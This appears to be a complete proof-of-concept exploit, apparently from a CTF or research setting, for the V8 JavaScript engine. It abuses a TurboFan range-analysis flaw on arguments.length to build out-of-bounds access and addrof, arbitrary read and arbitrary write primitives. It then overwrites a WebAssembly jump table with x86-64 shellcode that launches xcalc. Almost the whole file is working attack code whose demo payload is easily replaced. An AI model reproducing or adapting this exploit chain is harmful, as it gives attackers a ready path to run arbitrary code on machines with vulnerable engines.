let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert integer to hexadecimal string
function hex(i) {
    return `0x${i.toString(16)}`;
}


const kMaxArguments = 0xfffe;

let arr;
let oob_arr;
let tmp_obj = {};
let obj_arr;
let typed_arr;

function f() {
    let idx = arguments.length >> 16; // Range(0 >> 16, kMaxArguments >> 16) => Range(0, 0)

    // generate oob array
    arr = [1.1];
    oob_arr = [2.2];
    arr[idx * 11] = 8.691694759794e-311; // overwrite length of `oob_arr` with itof(0x1000n << 32n)

    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
}

for (let i = 0; i < 0x10000; i++) { f(); } // compile via turbofan
f(...(new Array(kMaxArguments + 2))); // pass 0x10000 arguments

console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`); // expected: 0x1000
console.assert(oob_arr.length == 0x1000);


// get address of `obj` in sandbox
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[7]);
}

// read 8-byte from `addr` in sandbox
function read8(addr) {
    // overwrite data pointer of `typed_arr`
    oob_arr[31] = itof(addr);
    oob_arr[32] = itof(0x0n);
    return typed_arr[0];
}

// write 8-byte `value` to `addr`
function write8(addr, value) {
    // overwrite data pointer of `typed_arr`
    oob_arr[31] = itof(addr);
    oob_arr[32] = itof(0x0n);
    typed_arr[0] = value;
}


// construct wasm module
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0x4, 0x1, 0x2, 0x0, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

// get address of jump table
let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = addrof(wasm_instance);
// console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let jump_table_start = read8(wasm_instance_addr - 1n + 0xe8n);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]; // output of shellcode.py

// overwrite backing store of arraybuffer with address of jump table
let buf = new ArrayBuffer(shellcode.length);
let buf_addr = addrof(buf);
// console.log(`[+] buf_addr == ${hex(buf_addr)}`);
write8(buf_addr - 1n + 0x20n, jump_table_start);

// overwrite jump table with shellcode
console.log("[+] Writing shellcode...");
let view = new DataView(buf);
for (let i = 0; i < shellcode.length; i++) {
    view.setUint8(i, shellcode[i]);
}

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
